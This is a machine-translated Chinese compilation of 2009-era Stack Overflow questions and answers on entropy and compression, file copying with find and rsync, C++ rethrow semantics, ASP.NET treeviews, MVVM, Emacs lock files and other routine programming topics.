> 时间：2009-03-16T16:23:56.823
> 
> 标签：compression, entropy, information-theory

我对熵公式的理解是它用于计算表示某些数据所需的最小位数。它通常在定义时措辞不同，但之前的理解是我直到现在所依赖的。

这是我的问题。假设我有一个 100 '1' 后跟 100 '0' = 200 位的序列。字母表是{0,1}，熵的底是2。符号“0”的概率是0.5，“1”是0.5。所以熵是 1 或 1 位来表示 1 位。

但是，您可以使用类似 100 / 1 / 100 / 0 的方式对其进行游程长度编码，其中输出的位数后跟位。似乎我的表示小于数据。特别是如果您将 100 增加到更大的数字。

我目前正在使用：[http](http://en.wikipedia.org/wiki/Information_entropy) ://en.wikipedia.org/wiki/Information_entropy作为参考。我哪里做错了？是分配给符号的概率吗？我不认为这是错的。还是我把压缩和熵之间的联系弄错了？还要别的吗？

谢谢。

**编辑**

我的后续回答是：您会将熵公式应用于消息的特定实例以尝试找出其信息内容吗？接受消息“aaab”并说熵是~0.811是否有效。如果是，那么 1...10....0 的熵是多少，其中 1 和 0 使用熵公式重复 n 次。答案是1？

是的，我了解您正在创建输入符号的随机变量，并根据您的消息猜测概率质量函数。我要确认的是熵公式没有考虑消息中符号的位置。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-16T16:37:49.037

> 还是我把压缩和熵之间的联系弄错了？

你非常接近，但最后一个问题是错误在哪里。如果您能够将某些内容压缩为小于其原始表示的形式，则意味着原始表示至少具有一些冗余。**消息中的每一位实际上都没有传达一点信息。**

因为冗余数据对消息的信息内容没有贡献，所以它也不会增加它的熵。例如，想象一个仅返回值“0”的“随机位生成器”。这根本不传达任何信息！（实际上，它传达了*不确定*数量的信息，因为任何仅包含一种符号的二进制消息都需要在熵公式中除以零。）

相比之下，如果您模拟大量随机抛硬币，则很难大幅减小此消息的大小。每一位将贡献接近 1 位的熵。

当您压缩数据时，您会提取冗余。作为交换，您必须设计一个知道如何压缩和解压缩这些数据的方案，从而付出一次性的熵代价；这本身需要一些信息。

> 但是，您可以使用类似 100 / 1 / 100 / 0 的方式对其进行游程长度编码，其中输出的位数后跟位。似乎我的表示小于数据。特别是如果您将 100 增加到更大的数字。

总而言之，您可以设计一种方案来使*数据的编码*小于*原始数据*，这一事实告诉您一些重要的事情。也就是说，它说**您的原始数据包含的信息很少**。

* * *

### 进一步阅读

要对此进行更彻底的处理，包括如何通过一些示例准确计算任意数字序列的熵，请查看[这个简短的白皮书](http://www.michaelharold.com/downloads/The%20Relationship%20of%20Entropy%20to%20Message%20Size%20in%20Binary%20Symbol%20Strings.pdf)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-03-16T16:25:36.083

看看[Kolmogorov 复杂度](http://en.wikipedia.org/wiki/Kolmogorov_complexity)

> 在不丢失信息的情况下，可以将字符串压缩成的最小位数。这是相对于由通用图灵机给出的固定但通用的解压缩方案定义的。

在您的特定情况下，不要将自己局限于字母 {0,1}。对于您的示例，请使用 {0...0, 1...1} （数百个 0 和数百个 1）

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-16T16:49:09.990

您的编码在此示例中有效，但可以设想一个同样有效的情况：010101010101... 将被编码为 1 / 0 / 1 / 1 / ...

熵是针对可以在给定字母表中构建的所有可能消息进行测量的，而不仅仅是病态示例！

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-03-21T01:33:10.510

John Feminella 说得对，但我认为还有更多话要说。

香农熵是基于概率的，而概率总是在旁观者的眼中。

您说 1 和 0 的可能性相同（0.5）。如果是这样，那么 100 个 1 后跟 100 个 0 的字符串的概率为 0.5^200，其中 -log(base 2) 为 200 位，如您所料。但是，该字符串的熵（用香农术语）是它的信息内容乘以它的概率，或者 200 * 0.5^200，仍然是一个非常小的数字。

这很重要，因为如果您使用运行长度编码来压缩字符串，在这个字符串的情况下，它会得到一个小的长度，但是对所有 2^200 个字符串进行平均，它就不会做得很好。运气好的话，平均会达到 200 左右，但不会更少。

另一方面，如果您查看原始字符串并说它是如此惊人以至于生成它的人可能会生成更多类似它，那么您实际上是在说它的概率大于 0.5^200，所以您正在制作一个不同的关于字符串生成器的原始概率结构的假设，即它的熵低于 200 位。

就个人而言，我发现这个主题非常有趣，尤其是当您查看 Kolmogorov（算法）信息时。在这种情况下，您将字符串的信息内容定义为可以生成它的最小程序的长度。这导致了对软件工程和语言设计的各种见解。

我希望这会有所帮助，并感谢您的提问。

# copy - 如何使用 cp 和/或 find 递归地将 src 中的所有 *.foo 文件复制到目标？

> ID：651136
> 
> 赞同：3
> 
> 时间：2009-03-16T16:24:20.720
> 
> 标签：copy, cygwin, find, cp

```
cp -v -ur path/to/jsps/ /dest/path/ 
```

上述命令将所有已更新的文件从源目录复制到目标，保留目录结构。

我不知道如何只复制 *.someExtention 文件。我知道你可以使用类似的东西：

```
find -f -name *.jsp -exec some awesome commands {} 
```

但我不知道该怎么做（而且我没有时间详细阅读信息页面）。

非常感谢所有帮助。

谢谢， LES

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-16T16:34:46.420

如果您想使用 find / cp 那么以下应该可以解决问题：

```
find -f -name *.jsp -exec cp --parents {} /dest/path \; 
```

但 rsync 可能是更好的工具。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T16:31:29.580

[rsync](http://samba.anu.edu.au/rsync/)可能会有所帮助-您可以告诉它仅使用包含和排除选项的组合复制某些文件，例如

```
rsync -a \
   --include='*.foo' \
   --include='*/' \
   --exclude='*' \
   path/to/jsps/ /dest/path/ 
```

请参阅[手册](http://samba.anu.edu.au/ftp/rsync/rsync.html)并查看标题为 FILTER RULES 的部分以了解更多信息。

# .net - 包含 XSLT 的 XML 的 HTTPWebRequest

> ID：651137
> 
> 赞同：0
> 
> 时间：2009-03-16T16:24:25.370
> 
> 标签：.net, xml, xslt, httpwebrequest

我正在使用该`HttpWebRequest`对象对使用 XML/XSLT 作为其前端的站点/Web 服务进行 get 调用。当我在 Firefox 中查看源代码时，会出现 XML，但是当我在程序中发出请求时，转换后的文档会返回给我。

由于转换后的文档对我来说非常无用，我怎样才能发出请求并获得直接的 XML？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T17:05:48.377

对我来说不是问题。基本上，我请求的主机需要一个真正的浏览器的 UserAgent 才能返回 xml。在我看来，最好留给 ContentType 或 Accepts 标头字段，但无论如何。

# c# - 如何防止我的树视图崩溃？

> ID：651144
> 
> 赞同：5
> 
> 时间：2009-03-16T16:27:50.977
> 
> 标签：c#, .net, asp.net, treeview

我正在使用带有 C# 2.0 和 Visual Studio 2005 的 ASP.NET。我正在使用母版页和内容页。我在母版页中有一个树视图菜单，当用户选择任何菜单项时，我会重定向到该内容页面。

我的问题是，在用户导航到内容页面后，所有树节点都会刷新并且结构会折叠。我希望选定的树节点保持扩展。

有人可以帮帮我吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-03-16T17:02:03.657

When you refresh the treeview you want to call treeView1.ExpandAll();

Also add an event for the BeforeCollapse and set the event's Cancel property to true, to prevent the user from collapsing your treenodes.

```
private void treeView1_BeforeCollapse(object sender, TreeViewCancelEventArgs e)
{
    e.Cancel = true;
} 
```

Hope this helps.

-jeremy

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T18:28:35.680

如果您使用 SiteMapDataSource 控件作为 TreeView 的数据源，这是一个很常见的问题，它会由 ASP.NET 自动处理。在这种情况下，您还没有提到 TreeView 的数据源是什么。

您还没有提到 TreeView 是否包含链接（`NavigateUrl`属性已设置）或每次点击回发的 Text 项。如果是前者，那么据我所知，你倒霉了！这是因为没有为已设置的 TreeNode 引发任何选择事件`NavigateUrl`。它们只是用作常规超链接。

但是，如果是后者，那么您可以尝试以下步骤：

**一个。**处理`SelectedNodeChanged`TreeView 的事件。在此事件处理程序中，检索属性的当前值`SelectedNode.ValuePath`并将其存储在 ViewState/Session 中。使用`Value`SelectedNode 的 有条件地将页面重定向到映射到它的 URL。

类似于以下内容：

```
protected void TreeView1_SelectedNodeChanged(object sender, EventArgs e) 
{ 
  TreeNode selNode = TreeView1.SelectedNode; 
  string pathToNode = selNode.ValuePath; 
  Session.Add("SelPath", pathToNode); 

  switch (selNode.Value) 
  { 
  //Redirect to URL accordingly. 
  } 
} 
```

**湾。**在随后加载主页面（您重定向到的页面）时，检索`ValuePath`之前设置的值并找到之前的 Selected 节点和`Expand`它。

类似于以下内容：

```
protected void Page_Load(object sender, EventArgs e) 
{ 
  if (Page.IsPostBack)
  { 
    string pathToNode = (string)Session("SelPath"); 
    Session.Remove("SelPath"); 
    TreeNode selNode = TreeView1.FindNode(pathToNode); 
    if (selNode != null) 
    { 
      selNode.Expand(); 
    } 
  } 
} 
```

请注意，我没有机会测试代码，所以这主要是假设性的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T17:02:11.550

Try using the OnTreeNodeDataBound event and the treeView.SelectedNode property

Also, might want to check how/ when you're binding your TreeView to it's DataSource. You might be rebinding it on IsPostBack which will re-render the tree.

The TreeView should maintain its nodes on PostBack.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T17:04:53.057

Even though you are using a Master page, once the user navigates to the content page it is rendered as a new/different page. Because of the Master page the same treeview is loaded but not the same instance. You will need to store and load what nodes were expanded.

# html - 您可以在选择字段中有多种字体颜色吗？

> ID：651146
> 
> 赞同：5
> 
> 时间：2009-03-16T16:27:57.780
> 
> 标签：html, css, html-select

是否可以有一个 HTML 选择字段，其中 OPTION 文本具有不同的颜色？

```
<select>
<option>Black_text (yellow_text)</option>
</select> 
```

我尝试使用 CSS SPAN 元素为文本着色，但这似乎不起作用。

有任何想法吗？

**更新：**注意，我试图在*同一个*OPTION 行上有多种字体颜色。我已经看过很多关于如何为*整个*OPTION 行设置样式的教程，但我正在尝试在*同一*选项行中设置元素的样式。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-16T16:31:29.050

尝试设置`option`元素本身的样式：

```
<option style="…">Label</option> 
```

但我怀疑浏览器是否支持这些元素的样式。

* * *

**编辑**

> 我试图在*同一*OPTION 行上有多种字体颜色。

这是不可能的，因为该[`option`元素](http://www.w3.org/TR/html401/interact/forms.html#edef-OPTION)只允许文本作为内容：

```
<!ELEMENT OPTION - O (#PCDATA)         -- selectable choice --> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T16:58:45.600

You probably can't do it with a plain vanilla select list. However, it probably would be possible to use Javascript + HTML + CSS to make your own "select list" using just div and span elements and that correct onclick, and onmouseover javascript. Would be much more difficult, but if it's really important, you could probably get it to work.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-26T19:39:24.227

为什么不在每一行上放一个背景图像，如下所示：

```
<option style="background-image: multicolorimage.jpg>some text</option> 
```

对不起，错误的答案。起初我不明白你想做什么所以无视我的帖子:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-03-02T11:02:55.003

不，但是您可以使用诸如[http://www.erichynds.com/jquery/jquery-ui-multiselect-widget/](http://www.erichynds.com/jquery/jquery-ui-multiselect-widget/)之类的东西，它使用按钮和跨度标签构建自己的选择框。

# reportingservices-2005 - 在 Microsoft Reporting Services 中使用代码修改参数

> ID：651149
> 
> 赞同：0
> 
> 时间：2009-03-16T16:28:17.793
> 
> 标签：reportingservices-2005

我制作了一份报告，其中包含大约 30 个不同的矩形和文本框，这些矩形和文本框根据参数具有不同的可见性表达式。（这是一张学生发票，根据学期的不同，必须出现许多不同的消息）当我做出所有表达式时，我在参数中全部用大写字母编码。现在，当用户输入小写字母时，我遇到了一个问题，SQL 一切正常，因为它不区分大小写，但不同的矩形和文本框不显示。报告代码中有没有办法在运行 SQL 之前首先将所有参数大写？或者我实际上是否必须回到每个可见性表达式并为大写和小写添加单独的 iif？（必须这样做似乎非常愚蠢）。我无法将参数更改为数字，因为我对输入有严格的要求。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T17:30:14.417

我不知道这是否是最优雅的解决方案，但您可以通过对“报告参数”页面上的每个参数执行以下过程来完成此操作：

1）重命名参数，保留旧参数的提示。

2）添加一个与旧参数同名的新参数。

3）将此新参数标记为隐藏。

4）确保新参数的可用值被标记为非查询（可用值永远不会被实际使用。）

5) 使用以下语法将默认值标记为未查询：=ucase(Parameters!OldParameterName.Value)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-21T06:55:19.493

你不能只用 UCASE 参数吗（在 xml 视图中做，它会更快，你甚至可以做一个正则表达式查找/替换）

# linux - 随着时间的推移存储使用报告的最佳方式是什么？

> ID：651153
> 
> 赞同：0
> 
> 时间：2009-03-16T16:29:09.743
> 
> 标签：linux, resources, storage, reporting

我目前有一些服务器报告，它们在运行时返回使用统计信息。数据是从几个不同的来源（主要是日志文件）收集的，因此它们一开始不在数据库中。

返回的数据是简单的列表，例如，详细说明用户正在使用多少磁盘空间（用户 => 空间）他们一个月使用的平均内存百分比（用户 => 内存）、平均 CPU 时间等。

其中一些信息是运行总数（如磁盘使用情况），其他信息是整个月拍摄的快照的平均值。

运行这些报告并查看结果非常有效，但我想开始存储这些结果以查看长期趋势。

最好的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T16:56:11.317

[CACTI](http://www.cacti.net/)非常有用且高度可配置。利用 RRD 工具。

RRD 工具很棒，b/c 它以循环格式存储数据并对其进行汇总。当 RRD 创建一个数据文件时，它会使用它将存储的每个数据点来创建它，因此它永远不会变大。您不必担心日志文件变得太大。关键是将其配置为按时间段进行汇总，例如每天、每月、每年。缺点是明年，您可能无法知道从今年 1 月 1 日开始的五分钟内的 CPU 使用率。但谁真正需要它？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T16:38:31.967

[RRDtool](http://oss.oetiker.ch/rrdtool/)似乎是明显的解决方案。

或者就此而言，开箱即用的监控工具之一，其中一些恰好使用 rrdtool 来存储其数据。例如[穆宁](http://munin.projects.linpro.no/)。

# c++ - 为什么抛出“无”会导致程序终止？

> ID：651154
> 
> 赞同：15
> 
> 时间：2009-03-16T16:29:30.380
> 
> 标签：c++, exception-handling

```
const int MIN_NUMBER = 4;
class Temp
{
public:

    Temp(int x) : X(x)
    {
    }

    bool getX() const
    {
        try
        {
            if( X < MIN_NUMBER)
            {
                //By mistake throwing any specific exception was missed out
                //Program terminated here
                throw ;
            }
        }
        catch (bool bTemp)
        {
            cout<<"catch(bool) exception";

        }
        catch(...)
        {
            cout<<"catch... exception";
        }
        return X;
    }

private:
    int X;
};

int main(int argc, char* argv[])
{
    Temp *pTemp = NULL;
    try
    {
        pTemp = new Temp(3);
        int nX = pTemp->getX();
        delete pTemp;
    }
    catch(...)
    {
        cout<<"cought exception";
    }

    cout<<"success";
    return 0;
} 
```

在上面的代码中，**throw false**是在 getX() 方法中使用的，但由于人为错误（！）**false**被遗漏了。看似无辜的代码使应用程序崩溃。

我的问题是为什么当我们抛出“无”时程序会终止？

我对基本上是“重新抛出”的理解很少`throw;`，必须在异常处理程序（catch）中使用。在任何其他地方使用这个概念会导致程序终止，那么为什么编译器在编译期间不引发标志？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2009-03-16T16:36:40.707

这是预期的行为。从 C++ 标准：

> 如果当前没有处理异常，则执行不带操作数的 throw 表达式调用 terminate()(15.5.1)。

至于为什么编译器无法诊断这一点，需要一些非常复杂的流程分析才能做到这一点，我猜编译器作者不会认为它具有成本效益。C++（和其他语言）充满了可能的错误，*理论上*编译器可以捕捉到这些错误，但实际上并非如此。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-03-16T16:52:00.560

详细说明尼尔的回答：

`throw;`本身将尝试重新引发当前正在展开的异常——如果多个正在展开，它会尝试重新抛出最近的异常。如果没有展开，则调用 terminate() 来表示您的程序做了一些虚假的事情。

至于您的下一个问题，为什么编译器不会`throw;`在 catch 块之外发出警告，是因为编译器无法在编译时判断该`throw;`行是否可能在 catch 块的上下文中执行。考虑：

```
// you can try executing this code on [http://codepad.org/pZv9VgiX][1]
#include <iostream>
using namespace std;

void f() {
    throw 1;
}
void g() {
    // will look at int and char exceptions
    try { 
        throw;
    } catch (int xyz){
        cout << "caught int " << xyz << "\n";
    } catch (char xyz){
        cout << "caught char " << xyz << "\n";
    }
}
void h() {
    try {
        f();
    } catch (...) {
        // use g as a common exception filter
        g();
    }
}
int main(){
    try {
        h();
    } catch (...) {
        cout << "some other exception.\n";
    }
} 
```

在这个程序中，`g()`作为一个异常过滤器运行，并且可以使用 from`h()`和任何其他可以使用这种异常处理行为的函数。你甚至可以想象更复杂的情况：

```
void attempt_recovery() {
    try{
        // do stuff
        return;

    } catch (...) {}

    // throw original exception cause
    throw;
}
void do_something() {
    for(;;) {
        try {
            // do stuff
        } catch (...) {
            attempt_recovery();
        }
    }
} 
```

在这里，如果 do_something 发生异常，将调用恢复代码。如果该恢复代码成功，则会忘记原始异常并重新尝试该任务。如果恢复代码失败，则忽略该失败并重新抛出先前的失败。这是因为`throw;`in是在'catch 块`attempt_recovery`的上下文中调用的。`do_something`

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2009-03-16T16:40:59.870

从 C++ 标准：

> 15.1 抛出异常
> 
> ...
> 
> 如果当前没有处理异常，则执行不调用操作数的抛出异常`terminate()`

`throw`编译器无法可靠捕获此类错误的原因是异常处理程序可以调用函数/方法，因此编译器无法知道`catch`. 这本质上是一个运行时的事情。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T16:40:10.450

> 我不太了解那个扔；基本上是“重新抛出”，必须在异常处理程序（catch）中使用。在任何其他地方使用这个概念会导致程序终止，那么为什么编译器在编译期间不引发标志？

重新抛出是有用的。假设您有一个三层深的调用堆栈，每一层都为最终调用添加一些上下文资源对象。现在，当您在叶级别遇到异常时，您将期望对对象创建的任何资源进行一些清理操作。但这还不是全部，叶子上方的调用者也可能分配了一些需要释放的资源。你是怎样做的？你*再扔*。

但是，您所拥有的不是重新抛出。这是在尝试捕获和处理引发的任何和所有异常失败后放弃的信号。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-16T16:41:13.893

在没有 args 的 catch 块内的 throw 将重新抛出被捕获的相同异常，因此它将在更高级别被捕获。

在没有参数的 catch 块之外抛出将导致程序终止。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T16:50:15.213

要通过编译器何时/为什么无法检测到问题的示例来完成前面的答案：

```
// Centralized exception processing (if it makes sense)
void processException()
{
   try {
      throw;
   }
   catch ( std::exception const & e )
   {
      std::cout << "Caught std::exception: " << e.what() << std::endl;
   }
   catch ( ... )
   {
      std::cout << "Caught unknown exception" << std::endl;
   }
}

int main()
{
   try
   {
      throw 1;
   }
   catch (...)
   {
      processException(); // correct, still in the catch clause
   }
   processException(); // terminate() no alive exception at the time of throw.
} 
```

编译函数*processException*时，编译器不知道如何以及何时调用它。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2009-03-16T16:33:03.010

您没有任何东西要捕获，因此异常会一直冒泡。甚至`catch(...)`需要*一些东西*。

# c++ - CBlobCache 使用 - ATL 服务器库

> ID：651158
> 
> 赞同：0
> 
> 时间：2009-03-16T16:30:21.673
> 
> 标签：c++, caching, atl

有人可能有一个使用 CBlobCache 的例子？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-17T01:11:51.747

BlobCache 文档和示例[位于 MSDN 上](http://msdn.microsoft.com/en-us/library/959f7k0f%28VS.80%29.aspx)。

# apache-flex - MVVM - 什么应该包含什么......什么应该创造什么

> ID：651166
> 
> 赞同：3
> 
> 时间：2009-03-16T16:32:01.873
> 
> 标签：apache-flex, silverlight, design-patterns, mvvm

我有一个正确的巴尼，让我了解如何使用 MVVM 模式将所有东西组合在一起。在实践中这一切似乎都很简单，但试图实现它我似乎打破了我尝试编码的各种其他规则。

顺便说一句，我正在尝试使用 Flex 来实现该模式，而不是 Silverlight 或 WPF，所以如果有人能提出不应该这样做的充分理由，那么我想听听他们的意见。

我有一个问题，我有几个观点。有时我必须同时在页面上显示两个视图；有时我会切换回单个视图。在我正常的 Flex 大脑中，我会有一个带有代码隐藏的主视图，其中包含我所有的其他视图（同样带有代码隐藏）。然后，该主视图将切换其他单独的视图。

当我尝试在 MVVM 中实现这一点时，我试图通过使用将 my`Views`与`ViewModels`. 假设我创建了一个`ViewModel`应用程序范围的状态，并`ApplicationView`绑定到该数据并执行子视图的所有切换。

现在，我应该在哪里为我的子视图创建视图模型？我在里面试过`ApplicationView`——这似乎不对。然后我尝试在应用程序视图之外并将它的实例传递给`ApplicationView`然后我的子模型绑定到它。我错过了什么吗？这些方法似乎都不适合试图将其解耦的全部要点。

任何解释这个问题的好书或链接将不胜感激。

干杯，詹姆斯

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-20T04:15:31.173

您指的方法是 ViewModel 组合。它有多个复杂的视图部件，需要绑定到它们自己的 ViewModel 实体。该方法需要为每个子 ViewModel 构建一个具有属性的根 ViewModel。然后根视图绑定到根视图模型，每个视图（无论是显示的还是折叠的）都绑定到根视图模型上的相应属性。

ViewModel 看起来像这样：

```
public class RootViewModel 
{
   ChildViewModelA ChildA { get; set; }
   ChildViewModelB ChildB { get; set; }
} 
```

视图看起来像这样：

```
<Grid>
   <ChildViewA DataContext="{Binding ChildA}" />
   <ChildViewB DataContext="{Binding ChildB}" />
</Grid> 
```

您也可以实现这一点，让自己选择一个活动的工作区。

ViewModel 看起来像这样：

```
public class RootViewModel 
{
   public List<ViewModel> ChildWorkspaces { get; set; }
   public ViewModel ActiveWorkspace { get; set; }

   public RootViewModel() 
   {
      ChildWorkspaces.Add(ChildViewModelA);
      ChildWorkspaces.Add(ChildViewModelB);
   }
} 
```

视图看起来像这样：

```
<Grid>
   <Grid.Resources>
      <DataTemplate DataType="ChildViewModelA">
          <ChildViewA />
      </DataTemplate>
      <DataTemplate DataType="ChildViewModelB">
          <ChildViewB />
      </DataTemplate>
   </Grid.Resources>
   <ContentControl Content="{Binding ActiveWorkspace}" />
</Grid> 
```

这将导致根据存储在 ActiveWorkspace 中的实际对象的类型隐式选择适当的视觉表示。

请原谅我的回答是在 WPF 中。我尽我最大的努力不被这一切的语法所困扰:-)

如您所见，多个“ViewModel”可能是模棱两可的。通常我们发现需要构建多个子实体来适当地构造 ViewModel。但是所有 ViewModel 实体都将位于根 View Model 对象中的某个位置。

在 WPF 中实现 MVVM 时，我更喜欢推断隐式应用数据上下文的可视元素（如本响应的后半部分所示）。在更复杂的场景中，我更喜欢使用 DataTemplateSelector 来进行决策。但在超级简单的情况下，您可以在 C#/ActionScript 中以命令方式或通过绑定以声明方式显式应用 DataContext。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-17T13:59:23.417

我已经看到在几个不同的 Flex 项目中使用的 MVVM 方法的变体，但我还没有看到一种对我来说感觉完全正确的方法。也就是说，我认为使用 Presentation Models 可以使 Flex 中的测试变得更加容易，所以我很确定将会有更多的应用程序围绕这种模式设计。

我见过的在 Flex 中实现 MVVM 的最简单方法是将各个`ViewModel`s 放在应用程序`Model`/`ModelLoactor`中。`ModelLoactor`包含任何全局数据，也可作为 all 的访问器`ViewModels`。然后可以通过`ApplicationViews`绑定到它们的特定对象，而可以通过命令和通过绑定到它们的父对象来更新。这种方法的一个好处是所有的数据逻辑都是本地化的。当然，这也可以看作是一个缺点，由于它对 all 的硬编码引用，中央有点脆弱。`ViewModel``ModelLocator``ViewModels``ModelLocator``ModelLocator``ViewModels`

我已经看到使用 Mate 框架可以使用更简洁的方法。Mate 允许更分散地注入`ViewModels`适当的`ApplicationViews`. （我想这也可以用 Swiz 来完成，我只是不熟悉那个框架）。使用 Mate，每个`ApplicationView`都`ViewModel`通过 Map 注入。这种方法最酷的地方在于如何`ViewModels`使用 EventMap（a 的 Mate 版本`FrontController`）进行更新。本质上，您`ApplicationViews`将调度由一个或`EventMaps`多个`ViewModels`. 这种方法允许一个用户手势或事件一次`ApplicationView`改变几个状态`ViewModels`。另外，因为这个逻辑被提取到了 Mate 的`EventMaps`，更改事件的处理方式或更改的方式非常容易`ViewModels`。当然，这种方法的主要缺点是您承诺使用 Mate 作为框架，这可能不是一个选项，具体取决于项目的要求。

我希望这会有所帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-02-09T11:42:32.150

我想分享我写的 MVVM (Silverlight) 与 PresentionModel (Flex) 的比较。它显示了相同模式的两种实现如何不同/比较：

[http://houseofbilz.com/archives/2010/12/29/cross-training-in-silverlight-flexmvvm-vs-presentation-model/](http://houseofbilz.com/archives/2010/12/29/cross-training-in-silverlight-flexmvvm-vs-presentation-model/)

# emacs - 如何更改 Emacs 自动恢复文件的名称？

> ID：651169
> 
> 赞同：2
> 
> 时间：2009-03-16T16:32:29.047
> 
> 标签：emacs

目前它以以下格式保存文件：

```
.#main.c -> sara@sara.home.com.27017:1231918415 
```

这使它成为问题，因为它以“.c”结尾。

我需要它是.#main.c#

更新：我有 emacs 22.1

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T18:03:06.460

那不是自动恢复文件，而是用作文件锁定令牌的链接。

### 更新

如果我告诉你，你会把我介绍给 Summer Glau 吗？

改变这一点可能并不容易。我只是挖了一下，它看起来像是在 C 代码中设置的。但是让我们问下一个问题：你为什么要这样做？我猜你正在为`.c`你不想匹配这些的文件打一个正则表达式。如果是这样，请注意所有这些锁定文件链接都以`.#`- 始终是硬编码的 - 因此您始终可以排除名称与“^.#”匹配的文件（取决于您使用的正则表达式语法。）

如果你真的想破解它，它位于 EMACS 22 的第 320 行的 filelock.c 中。代码如下：

```
/* Write the name of the lock file for FN into LFNAME.  Length will be
   that of FN plus two more for the leading `.#' plus 1 for the
   trailing period plus one for the digit after it plus one for the
   null.  */
#define MAKE_LOCK_NAME(lock, file) \
  (lock = (char *) alloca (SBYTES (file) + 2 + 1 + 1 + 1), \
   fill_in_lock_file_name (lock, (file)))

static void
fill_in_lock_file_name (lockfile, fn)
     register char *lockfile;
     register Lisp_Object fn;
{
  register char *p;
  struct stat st;
  int count = 0;

  strcpy (lockfile, SDATA (fn));

  /* Shift the nondirectory part of the file name (including the null)
     right two characters.  Here is one of the places where we'd have to
     do something to support 14-character-max file names.  */
  for (p = lockfile + strlen (lockfile); p != lockfile && *p != '/'; p--)
    p[2] = *p;

  /* Insert the `.#'.  */
  p[1] = '.';
  p[2] = '#';

  p = p + strlen (p);

  while (lstat (lockfile, &st) == 0 && !S_ISLNK (st.st_mode))
    {
      if (count > 9)
    {
      *p = '\0';
      return;
    }
      sprintf (p, ".%d", count++);
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-30T14:24:18.823

您可以升级到 emacs 24.3 并将以下行添加到您的 .emacs 文件中：

```
(setq create-lockfiles nil) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T16:40:41.680

这很奇怪，默认值应该有 # 在每一端..

您可以通过重新定义 auto-save-file-name-p 和 make-auto-save-file-name 函数来自定义名称。在 GNU emacs 中，您可以将 elisp 添加到您的 .emacs 文件中。

# android - Android - 铃声行为不一致

> ID：651175
> 
> 赞同：3
> 
> 时间：2009-03-16T16:33:09.717
> 
> 标签：android

我正在尝试将铃声从我的应用程序添加到 media/ringtones 文件夹。如果手机通过 USB 连接到计算机或安装在我的 Mac 上，则铃声不会显示在 SD 卡中，也不会显示在铃声设置中。

但是，如果我在拔下 USB 的情况下运行应用程序，则铃声显示正常。这不是 Ringdroid 的问题，它做同样的事情。

有人可以告诉我可能出了什么问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-16T21:23:17.007

您是否检查了 USB 大容量存储的设置？如果您想从手机访问 sd 卡的内容，它应该关闭。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-11-01T10:00:31.340

如果您将 SDCard 安装在 Mac 上，您的手机将无法访问它。

因此，如果您想在手机上使用 SDCard，则必须将其安装在那里（而不是其他任何地方）。

# ant - 巡航控制在子任务中丢失路径

> ID：651179
> 
> 赞同：0
> 
> 时间：2009-03-16T16:34:36.610
> 
> 标签：ant, cruisecontrol

我们在巡航控制方面有一些项目，大致是这样设置的：

巡航控制

```
<ant antfile="build.xml" dir="A" target="compile" inheritAll="false" /> 
```

在**A中，编译目标调用****B**中的 jar 目标，作为其编译的一部分 （在“编译”中）

```
<ant antfile="${B.dir}/build.xml" inheritAll="false" target="jar" />
<javac ... > 
```

所以**B**有一个jar任务。**A从****B**构建 jar ，然后在它的编译中使用它。

我遇到的问题是巡航控制似乎混淆了路径。虽然**A**编译任务直接从 ant 工作，但从 Cruisecontrol 运行时，它似乎试图根据**B** jar 设置中的路径找到它自己的内部库。

为了让它在 ant 中工作，我必须使用 inheritAll="false" 标志从**A调用****B**，但是这和使用 fork 调用 javac 似乎都不能解决问题。

 **可能相关 - 我们正在运行 ant @ 1.7 版，cc 服务器是 ant 1.6.5 版，我无法轻松更新。

有什么提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T17:00:31.040

In your CruiseControl configuration you can specify the [anthome or antscript attributes](http://cruisecontrol.sourceforge.net/main/configxml.html#ant-examples) so that you use your version of Ant, so you should be able to get the same behavior from CC that you get at the command-line.

# ruby-on-rails - 如何查找（）某些字段中唯一的所有记录？

> ID：651181
> 
> 赞同：10
> 
> 时间：2009-03-16T16:34:53.020
> 
> 标签：ruby-on-rails, activerecord, find, unique, distinct

我有一个“请求”对象的列表，每个对象都具有相当正常的活动记录质量。requests 表通过连接表“games_requests”与游戏表相关联，因此请求具有 request.games 数组。

问题是，有没有办法找到最后 n 个唯一请求，其中唯一性由游戏列和其他几个列定义，但特别忽略其他列（如请求用户的名称？）

